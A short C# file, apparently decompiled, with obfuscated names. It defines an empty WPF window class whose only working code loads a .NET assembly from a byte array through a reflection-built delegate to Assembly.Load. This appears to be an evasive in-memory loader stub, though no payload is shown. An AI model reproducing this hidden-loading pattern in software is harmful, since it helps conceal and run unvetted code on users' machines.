using System;
using System.Reflection;
using System.Windows;
using System.Windows.Markup;

namespace mtwnwk;

public class mdlpjc : Window, IComponentConnector
{
	internal delegate Assembly eutrel(byte[] byte_0);

	public void InitializeComponent()
	{
	}

	public static Assembly AppDomainLoad(byte[] sasqio)
	{
		return ((eutrel)Delegate.CreateDelegate(typeof(eutrel), typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }) ?? throw new InvalidOperationException()))(sasqio);
	}

	private void L(int connectionId, object target)
	{
	}
}
